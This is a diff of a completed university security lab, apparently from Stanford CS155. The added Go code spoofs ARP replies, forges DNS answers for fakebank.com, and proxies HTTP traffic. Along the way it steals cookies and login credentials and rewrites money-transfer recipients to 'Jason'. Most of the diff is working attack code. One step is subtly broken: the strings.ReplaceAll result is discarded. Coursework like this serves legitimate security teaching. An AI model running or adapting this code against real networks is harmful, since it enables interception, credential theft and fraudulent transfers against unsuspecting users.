@@ -17,9 +17,6 @@
 * This project based on the University of Michigan EECS388 Course Project.
  */
 
-// TODO #0: Read through this code in its entirety, to understand its
-//          structure and functionality.
-
 package main
 
 // These are the imports we used, but feel free to use anything from gopacket
@@ -85,13 +82,19 @@ func handleARPPacket(packet gopacket.Packet) {
 
         // Only grab ARP requests that did not originate from us
         if arpData.Operation == 1 && !bytes.Equal(arpData.SourceHwAddress, cs155.GetLocalMAC()) {
-            // TODO #1: When the client sends and ARP request, send a spoofed reply
-            //          (use ARPIntercept, SpoofARP, and SendRawEther where necessary)
+            // When the client sends and ARP request, send a spoofed reply
+            // (use ARPIntercept, SpoofARP, and SendRawEther where necessary)
             //
             // Hint:    Store all the data you need in the ARPIntercept struct and
             //          pass it to spoofARP(). spoofARP() returns a slice of bytes,
             //          which can be sent over the wire with sendRawEthernet()
-
+            arp_intercept := ARPIntercept {
+                SourceHwAddress: arpData.SourceHwAddress,
+                SourceProtAddress: arpData.SourceProtAddress,
+                DstHwAddress: arpData.DstHwAddress,
+                DstProtAddress: arpData.DstProtAddress,
+            }
+            sendRawEthernet(spoofARP(arp_intercept))
         }
     }
 }
@@ -102,12 +105,15 @@ func handleARPPacket(packet gopacket.Packet) {
 */
 type ARPIntercept struct {
 
-    // TODO #2: Figure out what needs to be intercepted from the ARP request
-    //          for the DNS server's IP address
+    // Figure out what needs to be intercepted from the ARP request
+    // for the DNS server's IP address
     //
     // Hint:    The types net.HardwareAddr and net.IP are the best way to represent
     //          a hardware address and an IP address respectively.
-
+    SourceHwAddress net.HardwareAddr
+    SourceProtAddress net.IP
+    DstHwAddress net.HardwareAddr
+    DstProtAddress net.IP
 }
 
 /*
@@ -127,7 +133,7 @@ func spoofARP(intercept ARPIntercept) []byte {
     // create a spoofed ARP reply and an Ethernet frame to send it in
     // We will need to fill in the headers for both Ethernet and ARP
 
-    // TODO #3: Fill in the missing fields below to construct your spoofed ARP response
+    // Fill in the missing fields below to construct your spoofed ARP response
 
     arp := &layers.ARP{
         AddrType:          layers.LinkTypeEthernet,
@@ -135,15 +141,15 @@ func spoofARP(intercept ARPIntercept) []byte {
         HwAddressSize:     6, // number of bytes in a MAC address
         ProtAddressSize:   4, // number of bytes in an IPv4 address
         Operation:         2, // Indicates this is an ARP reply
-        SourceHwAddress:   /* */,
-        SourceProtAddress: /* */,
-        DstHwAddress:      /* */,
-        DstProtAddress:    /* */,
+        SourceHwAddress:   cs155.GetLocalMAC(),
+        SourceProtAddress: intercept.DstProtAddress,
+        DstHwAddress:      intercept.SourceHwAddress,
+        DstProtAddress:    intercept.SourceProtAddress,
     }
     ethernet := &layers.Ethernet{
         EthernetType: layers.EthernetTypeARP,
         SrcMAC:       cs155.GetLocalMAC(),
-        DstMAC:       /* */,
+        DstMAC:       intercept.SourceHwAddress,
     }
 
     // Now that the packet is ready to be sent, we need to "flatten" its
@@ -259,8 +265,8 @@ func handleUDPPacket(packet gopacket.Packet) {
             sendRawUDP(53, intercept.reqIP, spoofedPacket)
         }
 
-        // TODO #4: When the client queries fakebank.com, send a spoofed response.
-        //          (use dnsIntercept, spoofDNS, and sendRawUDP where necessary)
+        // When the client queries fakebank.com, send a spoofed response.
+        // (use dnsIntercept, spoofDNS, and sendRawUDP where necessary)
         //
         // Hint:    Parse dnsData, then search for an exact match of "fakebank.com". To do
         //          this, you may have to index into an array; make sure its
@@ -282,9 +288,12 @@ func handleUDPPacket(packet gopacket.Packet) {
 */
 type dnsIntercept struct {
 
-    // TODO #5: Determine what needs to be intercepted from the DNS request
-    //          for fakebank.com in order to craft a spoofed answer.
-
+    // Determine what needs to be intercepted from the DNS request
+    // for fakebank.com in order to craft a spoofed answer.
+    reqIP net.IP
+    resIP net.IP
+    name  []byte
+    port layers.UDPPort
 }
 
 /*
@@ -307,19 +316,19 @@ func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
     // to start from layer 3 of the OSI model (IP) and work upwards, filling
     // in the headers of the IP, UDP, and finally DNS layers.
 
-    // TODO #6: Fill in the missing fields below to construct the base layers of
-    //          your spoofed DNS packet. If you are confused about what the Protocol
-    //          variable means, Google and IANA are your friends!
+    // Fill in the missing fields below to construct the base layers of
+    // your spoofed DNS packet. If you are confused about what the Protocol
+    // variable means, Google and IANA are your friends!
     ip := &layers.IPv4{
         // fakebank.com operates on IPv4 exclusively.
         Version:  4,
         Protocol: 17,
-        SrcIP:    /* */,
-        DstIP:    /* */,
+        SrcIP:    intercept.resIP,
+        DstIP:    intercept.reqIP,
     }
     udp := &layers.UDP{
         SrcPort: layers.UDPPort(53),
-        DstPort: /* */,
+        DstPort: intercept.port,
     }
 
     // The checksum for the level 4 header (which includes UDP) depends on
@@ -336,12 +345,12 @@ func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
         log.Panic("Tried to spoof a packet that doesn't appear to have a DNS layer.")
     }
 
-    // TODO #7: Populate the DNS layer (dns) with your answer that points to the attack web server
-    //          Your business-minded friends may have dropped some hints elsewhere in the network!
+    // Populate the DNS layer (dns) with your answer that points to the attack web server
+    // Your business-minded friends may have dropped some hints elsewhere in the network!
     resource := layers.DNSResourceRecord{
-        Name:  /* */,
+        Name:  intercept.name,
         Type:  layers.DNSType(1),
-        IP:    /* */,
+        IP:    net.ParseIP(strings.Split(cs155.GetLocalIP(), "/")[0]),
         Class: layers.DNSClass(1),
     }
     dns.ANCount = 1
@@ -421,20 +430,27 @@ func handleHTTP(rw http.ResponseWriter, r *http.Request) {
         os.Exit(1)
     }
 
-    // TODO #8: Handle HTTP requests. Roughly speaking, you should delegate most of the work to
-    //          SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
-    //          and use this function for the more general tasks that remain, like stealing cookies
-    //          and actually communicating over the network.
+    // Handle HTTP requests. Roughly speaking, you should delegate most of the work to
+    // SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
+    // and use this function for the more general tasks that remain, like stealing cookies
+    // and actually communicating over the network.
     //
     // Hint:    You will want to create an http.Client object to deliver the spoofed
     //          HTTP request, and to capture the real fakebank.com's response.
     //
     // Hint:    Make sure to check for cookies in both the request and response!
-
-
+    for i := 0; i < len(r.Cookies()); i++ {
+        cs155.StealClientCookie(r.Cookies()[i].Name, r.Cookies()[i].Value)
+    }
     spoofedRequest := spoofBankRequest(r)
-
-
+    client := &http.Client{}
+    res, err := client.Do(spoofedRequest)
+    if err != nil {
+        log.Panic(err)
+    }
+    for i := 0; i < len(res.Cookies()); i++ {
+        cs155.StealServerCookie(res.Cookies()[i].Name, res.Cookies()[i].Value)
+    }
     writeClientResponse(res, r, &rw)
 }
 
@@ -452,10 +468,10 @@ func spoofBankRequest(origRequest *http.Request) *http.Request {
 
     if origRequest.URL.Path == "/login" {
 
-        // TODO #9: Since the client is logging in,
-        //          - parse the request's form data,
-        //          - steal the credentials,
-        //          - make a new request, leaving the values untouched
+        // Since the client is logging in,
+        // - parse the request's form data,
+        // - steal the credentials,
+        // - make a new request, leaving the values untouched
         //
         // Hint:    Once you parse the form (Google is your friend!), the form
         //          becomes a url.Values object. As a consequence, you cannot
@@ -466,8 +482,11 @@ func spoofBankRequest(origRequest *http.Request) *http.Request {
         // Hint:    http.NewRequest()'s third parameter, body, is an io.Reader object.
         //          You can wrap the URL-encoded form data into a Reader with the
         //          strings.NewReader() function.
-
-
+        if origRequest.ParseForm() == nil {
+            cs155.StealCredentials(origRequest.FormValue("username"), origRequest.FormValue("password"))
+            io_reader := strings.NewReader(origRequest.Form.Encode())
+            bankRequest, _ = http.NewRequest("POST", bankURL, io_reader)
+        }
 
     } else if origRequest.URL.Path == "/logout" {
 
@@ -476,11 +495,15 @@ func spoofBankRequest(origRequest *http.Request) *http.Request {
 
     } else if origRequest.URL.Path == "/transfer" {
 
-        // TODO #10: Since the client is transferring money,
-        //          - parse the request's form data
-        //          - if the form has a key named "to", modify it to "Jason"
-        //          - make a new request with the updated form values
-
+        // Since the client is transferring money,
+        // - parse the request's form data
+        // - if the form has a key named "to", modify it to "Jason"
+        // - make a new request with the updated form values
+        if origRequest.ParseForm() == nil {
+            origRequest.Form.Set("to", "Jason")
+            io_reader := strings.NewReader(origRequest.Form.Encode())
+            bankRequest, _ = http.NewRequest("POST", bankURL, io_reader)
+        }
 
     } else {
         // Silently pass-through any unidentified requests
@@ -514,20 +537,27 @@ func writeClientResponse(bankResponse *http.Response, origRequest *http.Request,
 
     if origRequest.URL.Path == "/transfer" {
 
-        // TODO #11: Use the original request to change the recipient back to the
-        //          value expected by the client.
+        // Use the original request to change the recipient back to the
+        // value expected by the client.
         //
         // Hint:    Unlike an http.Request object which uses an io.Reader object
         //          as the body, the body of an http.Response object is an io.ReadCloser.
         //          ioutil.ReadAll() takes an io.ReadCloser and outputs []byte.
         //          ioutil.NopCloser() takes an io.Reader and outputs io.ReadCloser.
-        //      strings.ReplaceAll() replaces occurrences of substrings in string.
-        //      You can convert between []bytes and strings via string() and []byte.
+        //          strings.ReplaceAll() replaces occurrences of substrings in string.
+        //          You can convert between []bytes and strings via string() and []byte.
         //
         // Hint:    bytes.NewReader() is analogous to strings.NewReader() in the
         //          /login endpoint, where you could wrap a string in an io.Reader.
-
-
+        if origRequest.ParseForm() == nil {
+            response_body, err := ioutil.ReadAll(bankResponse.Body)
+            if err != nil {
+                log.Panic(err)
+            }
+            response_body_string := string(response_body)
+            strings.ReplaceAll(response_body_string, "Jason", origRequest.FormValue("to"))
+            bankResponse.Body = ioutil.NopCloser(strings.NewReader(response_body_string))
+        }
     }
 
     // Now that all changes are complete, write the body
